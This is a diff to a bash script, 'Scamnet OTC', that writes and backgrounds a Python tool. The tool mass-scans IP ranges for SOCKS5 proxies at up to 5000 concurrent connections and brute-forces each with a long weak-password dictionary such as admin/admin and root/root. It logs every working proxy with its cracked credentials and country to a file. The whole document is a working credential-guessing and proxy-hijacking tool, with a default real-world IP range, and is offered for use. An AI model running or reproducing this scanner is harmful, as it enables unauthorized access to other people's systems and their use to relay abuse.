@@ -1,5 +1,5 @@
 #!/bin/bash
-# main.sh - Scamnet OTC 全协议异步扫描器（v4.1 - 安全修复 + 性能优化）
+# main.sh - Scamnet OTC v4.1（防中断 + 超时 + 安全注入）
 set -euo pipefail
 IFS=$'\n\t'
 
@@ -8,7 +8,7 @@ LOG_DIR="logs"; mkdir -p "$LOG_DIR"
 LATEST_LOG="$LOG_DIR/latest.log"
 RUN_SCRIPT="$LOG_DIR/run_$(date +%Y%m%d_%H%M%S).sh"
 
-echo -e "${GREEN}[OTC] Scamnet v4.1 (安全修复 + 异步极速 + 自动后台)${NC}"
+echo -e "${GREEN}[OTC] Scamnet v4.1 (防中断 + 异步极速)${NC}"
 echo "日志 → $LATEST_LOG"
 
 # ==================== 依赖安装 ====================
@@ -31,10 +31,10 @@ fi
 DEFAULT_START="157.254.32.0"
 DEFAULT_END="157.254.52.255"
 echo -e "${YELLOW}请输入起始 IP（默认: $DEFAULT_START）:${NC}"
-read -r START_IP
+read -r START_IP || { echo "[!] 输入中断"; exit 1; }
 START_IP=${START_IP:-$DEFAULT_START}
 echo -e "${YELLOW}请输入结束 IP（默认: $DEFAULT_END）:${NC}"
-read -r END_IP
+read -r END_IP || { echo "[!] 输入中断"; exit 1; }
 END_IP=${END_IP:-$DEFAULT_END}
 
 # 验证 IP
@@ -51,7 +51,7 @@ echo -e "${GREEN}[*] 扫描范围: $START_IP - $END_IP${NC}"
 # ==================== 输入自定义端口 ====================
 echo -e "${YELLOW}请输入端口（默认: 1080）:${NC}"
 echo " 支持格式：1080 / 1080 8080 / 1-65535"
-read -r PORT_INPUT
+read -r PORT_INPUT || { echo "[!] 输入中断"; exit 1; }
 PORT_INPUT=${PORT_INPUT:-1080}
 
 # 解析端口
@@ -66,18 +66,24 @@ else
 fi
 echo -e "${GREEN}[*] 端口配置: $PORT_INPUT → $PORTS_CONFIG${NC}"
 
-# ==================== 安全转义函数 ====================
+# ==================== 安全转义（防中断 + 超时）===================
 escape_yaml() {
-    python3 -c 'import sys, json; sys.stdout.write(json.dumps(sys.stdin.read()))'
+    timeout 3 python3 - <<'PY'
+import sys, json
+try:
+    data = sys.stdin.read()
+    print(json.dumps(data), end='')
+except Exception:
+    print("", end='')
+PY
 }
 
-# ==================== 生成后台运行脚本 ====================
+# ==================== 生成后台脚本 ====================
 cat > "$RUN_SCRIPT" << 'EOF'
 #!/bin/bash
 set -euo pipefail
 cd "$(dirname "$0")"
 
-# 创建 config.yaml（变量由外部注入）
 cat > config.yaml << CONFIG
 input_range: "${START_IP}-${END_IP}"
 $PORTS_CONFIG
@@ -85,19 +91,16 @@ timeout: 5.0
 max_concurrent: 5000
 CONFIG
 
-# 异步扫描器 scanner_async.py
 cat > scanner_async.py << 'PY'
 #!/usr/bin/env python3
 import asyncio
 import aiohttp
 import ipaddress
-import sys
 import yaml
 from tqdm.asyncio import tqdm_asyncio
 import warnings
 warnings.filterwarnings("ignore", category=DeprecationWarning)
 
-# ==================== 加载配置 ====================
 with open('config.yaml') as f:
     cfg = yaml.safe_load(f)
 INPUT_RANGE = cfg['input_range']
@@ -105,7 +108,6 @@ RAW_PORTS = cfg.get('ports', cfg.get('range'))
 TIMEOUT = cfg.get('timeout', 5.0)
 MAX_CONCURRENT = cfg.get('max_concurrent', 5000)
 
-# ==================== 解析 IP/端口 ====================
 def parse_ip_range(s):
     if '/' in s:
         return [str(ip) for ip in ipaddress.ip_network(s, strict=False).hosts()]
@@ -125,14 +127,12 @@ ips = parse_ip_range(INPUT_RANGE)
 ports = parse_ports(RAW_PORTS)
 print(f"[*] IP: {len(ips):,}, 端口: {len(ports)}, 总任务: {len(ips)*len(ports):,}")
 
-# ==================== 全局变量 ====================
 valid_count = 0
 detail_lock = asyncio.Lock()
 valid_lock = asyncio.Lock()
 country_cache = {}
 semaphore = asyncio.Semaphore(MAX_CONCURRENT)
 
-# ==================== 弱口令字典（去重合并）===================
 WEAK_PAIRS = list(set([
     # === 原始列表 ===
     ("123","123"),("admin","admin"),("root","root"),("user","user"),("proxy","proxy"),("111","111"),("1","1"),("qwe123","qwe123"),
@@ -203,7 +203,6 @@ WEAK_PAIRS = list(set([
     ("z","z"),("zz","zz"),("zzz","zzz"),("zzzz","zzzz"),("zzzzz","zzzzz"),("zzzzzz","zzzzzz")
 ]))
 
-# ==================== 国家查询 ====================
 async def get_country(ip, session):
     if ip in country_cache: return country_cache[ip]
     for url in [
@@ -213,11 +212,7 @@ async def get_country(ip, session):
         try:
             async with session.get(url, timeout=5) as r:
                 if r.status == 200:
-                    if "json" in url:
-                        data = await r.json()
-                        code = data.get("countryCode", "").strip().upper()
-                    else:
-                        code = (await r.text()).strip().upper()
+                    code = (await r.json()).get("countryCode","").strip().upper() if "json" in url else (await r.text()).strip().upper()
                     if len(code) == 2 and code.isalpha():
                         country_cache[ip] = code
                         return code
@@ -225,16 +220,10 @@ async def get_country(ip, session):
     country_cache[ip] = "XX"
     return "XX"
 
-# ==================== 异步测试函数 ====================
 async def test_socks5(ip, port, session, auth=None):
     proxy_auth = aiohttp.BasicAuth(*auth) if auth else None
     try:
-        async with session.get(
-            "http://ifconfig.me/",
-            proxy=f"socks5h://{ip}:{port}",
-            proxy_auth=proxy_auth,
-            timeout=aiohttp.ClientTimeout(total=TIMEOUT)
-        ) as r:
+        async with session.get("http://ifconfig.me/", proxy=f"socks5h://{ip}:{port}", proxy_auth=proxy_auth, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
             export_ip = (await r.text()).strip()
             latency = round(r.extra.get("time_total", 0) * 1000)
             return True, latency, export_ip
@@ -258,76 +247,54 @@ async def scan(ip, port, session):
             if weak[0]:
                 auth_pair, lat, exp = weak
                 ok = True
-
         if ok:
-            # 优先查 export_ip，其次 proxy_ip
             country = "XX"
-            if exp and exp != ip and exp not in ("", "Unknown"):
+            if exp and exp != ip:
                 country = await get_country(exp, session)
             if country == "XX":
                 country = await get_country(ip, session)
-
             auth_str = f"{auth_pair[0]}:{auth_pair[1]}" if auth_pair else ""
             global valid_count
             valid_count += 1
             fmt = f"socks5://{auth_str}@{ip}:{port}#{country}".replace("@:", ":")
-            
             async with valid_lock:
                 with open("socks5_valid.txt", "a", encoding="utf-8") as f:
                     f.write(fmt + "\n")
             print(f"[+] 发现 #{valid_count}: {fmt}")
-
         status = "OK (Weak)" if auth_pair else ("OK" if ok else "FAIL")
         line = f"{ip}:{port} | {status} | {country} | {lat}ms | {exp} | {auth_str}"
         async with detail_lock:
             with open("result_detail.txt", "a", encoding="utf-8") as f:
                 f.write(line + "\n")
 
-# ==================== 主函数 ====================
 async def main():
-    with open("result_detail.txt", "w", encoding="utf-8") as f:
-        f.write(f"# Scamnet v4.1 详细日志 - {asyncio.get_event_loop().time()}\n")
-    with open("socks5_valid.txt", "w", encoding="utf-8") as f:
-        f.write("# socks5://user:pass@ip:port#CN\n")
-
-    connector = aiohttp.TCPConnector(
-        limit=MAX_CONCURRENT,
-        limit_per_host=10,
-        ssl=False,
-        force_close=True,
-        enable_cleanup_closed=True
-    )
-    timeout = aiohttp.ClientTimeout(total=TIMEOUT)
-    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+    with open("result_detail.txt", "w") as f: f.write("# Scamnet v4.1\n")
+    with open("socks5_valid.txt", "w") as f: f.write("# socks5://...\n")
+    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT, limit_per_host=10, ssl=False, force_close=True, enable_cleanup_closed=True)
+    async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as session:
         tasks = [scan(ip, port, session) for ip in ips for port in ports]
         for f in tqdm_asyncio.as_completed(tasks, total=len(tasks), desc="扫描", unit="conn", ncols=100):
             await f
-
-    print(f"\n[+] 扫描完成！共发现 {valid_count} 个可用代理 → socks5_valid.txt")
+    print(f"\n[+] 完成！发现 {valid_count} 个 → socks5_valid.txt")
 
 if __name__ == "__main__":
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
-        print(f"\n[!] 用户中断，已保存 {valid_count} 个结果")
+        print(f"\n[!] 中断！已保存 {valid_count} 个")
 PY
 
 chmod +x scanner_async.py
-
-# 初始化结果文件
 > result_detail.txt
 > socks5_valid.txt
-
-echo "[OTC] 异步扫描启动..."
+echo "[OTC] 扫描启动..."
 python3 scanner_async.py
-VALID=$(grep -c "^socks5://" socks5_valid.txt || echo 0)
-echo -e "\n${GREEN}[+] 完成！发现 ${VALID} 个代理${NC}"
 EOF
 
-# ==================== 安全注入变量 ====================
-START_IP_ESC=$(escape_yaml "$START_IP")
-END_IP_ESC=$(escape_yaml "$END_IP")
-PORTS_CONFIG_ESC=$(escape_yaml "$PORTS_CONFIG")
+# ==================== 注入变量（安全）===================
+START_IP_ESC=$(echo "$START_IP" | escape_yaml)
+END_IP_ESC=$(echo "$END_IP" | escape_yaml)
+PORTS_CONFIG_ESC=$(echo "$PORTS_CONFIG" | escape_yaml)
 
 sed -i \
     -e "s|\${START_IP}|$START_IP_ESC|g" \
@@ -337,10 +304,9 @@ sed -i \
 
 chmod +x "$RUN_SCRIPT"
 
-# ==================== 启动后台任务 ====================
-echo -e "${GREEN}[*] 启动后台扫描（关闭窗口不会中断）...${NC}"
+# ==================== 启动后台 ====================
+echo -e "${GREEN}[*] 启动后台扫描...${NC}"
 echo " 查看进度: tail -f $LATEST_LOG"
 echo " 停止扫描: pkill -f scanner_async.py"
 nohup "$RUN_SCRIPT" > "$LATEST_LOG" 2>&1 &
 echo -e "${GREEN}[+] 已启动！PID: $!${NC}"
-echo " 日志实时更新: tail -f $LATEST_LOG"
